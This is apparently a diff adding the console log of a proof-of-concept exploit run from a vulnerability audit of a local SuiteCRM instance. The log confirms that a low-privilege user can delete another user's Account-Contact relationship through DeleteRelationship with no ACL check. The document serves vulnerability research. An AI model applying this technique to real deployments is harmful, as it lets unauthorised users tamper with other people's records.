@@ -1,0 +1,22 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-022/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-022/../.venv
+========================================================================
+VULN-022: DeleteRelationship -- delete any relationship on any record (no ACL)
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web login
+[SETUP] provisioning victim (V) and attacker (A) -- fresh, unrelated low-priv users
+[INFO] victim   = mod_24cb927f (ac0845bc-af26-484b-928c-7c44ab20e7e4)
+[INFO] attacker = mod_5e2aad63 (17e66deb-50dd-4f38-bdc0-841c4bdc896f)
+[SETUP] as V: create an Account
+[OK] Account created: 0be907cd-5a62-47ff-8683-b22c2fd1cb51 (V022Acc_f7d5fdc1), owned by V
+[SETUP] as V: create a Contact related to that Account (account_id set directly)
+[OK] Contact created: 6ccf7b0c-70f1-4668-96b2-b92a14ac9d46 (last_name=V022Contact_efd22c9e), related to the Account, owned by V
+[STEP] confirm the seeded relationship row exists in the DB before the attack
+[INFO] accounts_contacts row BEFORE attack: 'b0b3d685-0134-4bf1-819e-832f667eda4f\t0'
+[STEP] as A (zero relationship to V's Account/Contact): DeleteRelationship on V's Account
+[INFO] attack response status=200 len=0
+[PROOF] re-querying accounts_contacts row AFTER the attacker's DeleteRelationship
+[PROOF] accounts_contacts row AFTER attack: 'b0b3d685-0134-4bf1-819e-832f667eda4f\t1\t2026-09-28 20:47:52'
+[OK] attacker A (no ACL, no relation to either record) deleted V's Account<->Contact relationship (accounts_contacts.id=b0b3d685-0134-4bf1-819e-832f667eda4f, deleted 0 -> 1)
+==> VULN-022: CONFIRMED — non-owner A deleted V's accounts_contacts relationship b0b3d685-0134-4bf1-819e-832f667eda4f via DeleteRelationship, no ACL check
